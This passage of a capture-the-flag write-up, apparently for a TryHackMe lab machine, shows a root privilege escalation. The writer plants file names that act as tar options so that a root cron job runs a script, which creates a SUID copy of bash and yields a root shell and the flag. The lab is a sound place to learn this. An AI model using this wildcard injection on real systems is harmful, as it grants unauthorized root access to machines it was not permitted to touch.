bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw$ mv Desktop/ desktop.bak
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw$ mkdir -p Desktop/.uh_oh
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw$ cd Desktop/.uh_oh/
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop/.uh_oh$ ls -la
total 8
drwxr-xr-x 2 bobloblaw www-data 4096 Nov 20 00:25 .
drwxr-xr-x 3 bobloblaw www-data 4096 Nov 20 00:25 ..
```
## Running commands as root
Now for root, [this](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) blog post explains very nicely how we can use tar wildcard to execute commmands.

### Commands used on the post
```console
echo "cp /bin/bash /tmp/bash && chmod 4777 /tmp/bash" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```
So, lets use these commands and create files on the directory.

```console
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop/.uh_oh$ pwd
/home/bobloblaw/Desktop/.uh_oh
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop/.uh_oh$ echo "cp /bin/bash /tmp/bash && chmod 4777 /tmp/bash" > shell.sh
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop/.uh_oh$ echo "" > "--checkpoint-action=exec=sh shell.sh"
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop/.uh_oh$ echo "" > --checkpoint=1
```
And now we wait for the cron to make an archive which we execute commands inside file shell.sh.

### Checking /tmp/bash
```console
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop/.uh_oh$ ls -la /tmp/bash
-rwsrwxrwx 1 root root 1099016 Nov 20 00:29 /tmp/bash
```
The binary is owned by root and has SUID bit set.
### Getting a root shell
```console
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop/.uh_oh$ /tmp/bash -p
bash-4.4# id
uid=1000(bobloblaw) gid=33(www-data) euid=0(root) groups=33(www-data)
```
And we have a euid of root.

### Reading root flag
```console
bash-4.4# cd /root
bash-4.4# cat root.txt 
THM{G00D****************3!}
bash-4.4# 
```